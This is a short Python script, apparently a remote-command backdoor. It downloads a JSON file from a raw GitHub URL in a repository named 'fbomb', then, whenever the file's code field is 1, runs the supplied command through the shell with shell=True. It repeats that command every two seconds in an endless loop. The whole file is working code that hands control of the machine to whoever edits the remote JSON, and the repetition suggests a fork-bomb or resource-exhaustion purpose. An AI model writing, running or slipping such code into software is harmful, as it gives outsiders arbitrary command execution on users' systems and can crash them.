import requests
import subprocess
import json
import time

JSON = "https://raw.githubusercontent.com/JuanBindez/fbomb/main/fbomb.json"

def read_json_and_execute_command(link):
    response = requests.get(link)
    
    while True:
        time.sleep(2)
        if response.status_code == 200:
            data = response.json()
            if data["code"] == 1:
                command = data["command"]
                subprocess.run(command, shell=True)
                print("Command executed successfully.")
            elif data["code"] == 0:
                print("Code is 0. Nothing to do.")
            else:
                print("Invalid code in JSON.")
        else:
            print("Error fetching JSON:", response.status_code)

read_json_and_execute_command(JSON)
